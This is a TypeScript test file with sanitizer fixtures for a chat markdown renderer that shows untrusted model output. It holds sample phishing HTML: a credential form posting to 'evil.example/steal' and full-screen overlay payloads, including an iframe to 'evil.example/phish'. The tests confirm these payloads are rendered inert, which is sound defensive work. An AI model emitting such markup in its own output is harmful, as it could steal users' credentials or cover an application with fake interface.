/**
 * RENDER-level sanitizer fixtures — the counterpart to
 * ./sanitize-invariant.test.ts, which asserts the SCHEMA.
 *
 * Why both: the schema is not the observable. `hast-util-sanitize` falls back
 * from `attributes[tagName]` to `attributes['*']` for any property the per-tag
 * list omits, so a schema assertion ("`attributes.input` omits `name`") can be
 * green while the attribute still lands in the DOM. That exact gap shipped —
 * `attributes.input` was documented as "EXACTLY the GFM task-list contract and
 * nothing else" and `<input name="password" size="40">` kept both attributes,
 * because defaultSchema carries the whole form vocabulary on `*`.
 *
 * So the rule these fixtures encode: for anything that matters, assert on what
 * comes out of `SimpleMarkdownRenderer` (the CHAT surface — untrusted model
 * output), not on the schema that is supposed to produce it.
 */
import React from 'react'
import { describe, it, expect } from 'vitest'
import { render } from '@testing-library/react'
import { SimpleMarkdownRenderer } from '../index'

describe('sanitizer — rendered output on the chat surface', () => {
  it('renders a credential form INERT: no action, no method, no named inputs', () => {
    const md =
      '<form action="https://evil.example/steal" method="post">' +
      '<input name="email" size="40"><input name="password" size="40">' +
      '<button type="submit">Sign in</button></form>'
    const { container } = render(<SimpleMarkdownRenderer content={md} />)

    const form = container.querySelector('form')
    // The tag itself is allowed (escaping it would show markup as prose), but
    // it must carry no submission target and no field identity — with neither,
    // there is nothing for a click to exfiltrate.
    expect(form?.getAttribute('action')).toBeNull()
    expect(form?.getAttribute('method')).toBeNull()
    for (const input of Array.from(container.querySelectorAll('input'))) {
      expect(input.getAttributeNames()).not.toContain('name')
      expect(input.getAttributeNames()).not.toContain('value')
      expect(input.getAttributeNames()).not.toContain('size')
    }
  })

  it('still renders a GFM task list as real checkboxes (positive control)', () => {
    const { container } = render(
      <SimpleMarkdownRenderer content={'- [x] done\n- [ ] todo\n'} />,
    )
    const boxes = Array.from(container.querySelectorAll('input[type="checkbox"]'))
    expect(boxes).toHaveLength(2)
    expect(boxes[0].hasAttribute('checked')).toBe(true)
    expect(boxes[1].hasAttribute('checked')).toBe(false)
  })

  /**
   * Narrowing `*` must not silently change what authored content renders to.
   * Note the asymmetry this fixture records: the SCHEMA re-allows `name` on
   * `<a>` (see sanitize-invariant.test.ts), but the base `a` renderer builds its
   * own element from `href` + children and never forwards `name`, so a legacy
   * `<a name="…">` anchor does not reach the DOM — and did not before the
   * narrowing either (verified by reverting it). The schema allowance is
   * therefore belt-and-braces, not the reason this renders as it does.
   */
  it('does not change what authored list/anchor markup renders to', () => {
    const { container } = render(
      <SimpleMarkdownRenderer
        content={'<a name="section-two">anchor</a>\n\n<ol><li value="3">three</li></ol>'}
      />,
    )
    // Both attributes are absent — and were absent BEFORE `*` was narrowed,
    // because the base renderers rebuild these elements. The content itself is
    // untouched, which is the property that matters.
    expect(container.querySelector('a')?.textContent).toBe('anchor')
    expect(container.querySelector('a')?.getAttribute('name')).toBeNull()
    expect(container.querySelector('li')?.textContent).toBe('three')
    expect(container.querySelector('li')?.getAttribute('value')).toBeNull()
  })
})

/**
 * UI-REDRESS / OVERLAY class. `style` is allowed on the tags a content audit
 * found using it, but the POSITIONING subset of CSS is not decoration — it lifts
 * untrusted markup out of the message body and puts it over the application.
 *
 * All three payloads below rendered verbatim before the guard: an
 * attacker-controlled cross-origin document (or a plain opaque `<span>`)
 * covering the whole viewport above every piece of app chrome, from ONE chat
 * message, i.e. from model output.
 */
describe('sanitizer — positioning styles cannot lift content out of the flow', () => {
  const OVERLAYS: Record<string, string> = {
    'cross-origin iframe':
      '<iframe src="https://evil.example/phish" style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647"></iframe>',
    'bare span': '<span style="position:fixed;inset:0;background:#fff;z-index:2147483646">fake ui</span>',
    'div with sticky': '<div style="position:sticky;top:0;z-index:9999">bar</div>',
  }

  for (const [name, md] of Object.entries(OVERLAYS)) {
    it(`strips the positioning declarations: ${name}`, () => {
      const { container } = render(<SimpleMarkdownRenderer content={md} />)
      const html = container.innerHTML
      expect(html).not.toMatch(/position\s*:\s*(fixed|absolute|sticky)/i)
      expect(html).not.toMatch(/z-index/i)
      expect(html).not.toMatch(/\binset\s*:/i)
    })
  }

  it('keeps ordinary decorative styling on the same element', () => {
    const { container } = render(
      <SimpleMarkdownRenderer
        content={'<div style="background:#eee;padding:8px;text-align:center;position:fixed">note</div>'}
      />,
    )
    const style = container.querySelector('div[style]')?.getAttribute('style') ?? ''
    expect(style).toMatch(/background/)
    expect(style).toMatch(/padding/)
    expect(style).toMatch(/text-align/)
    expect(style).not.toMatch(/position/)
  })
})
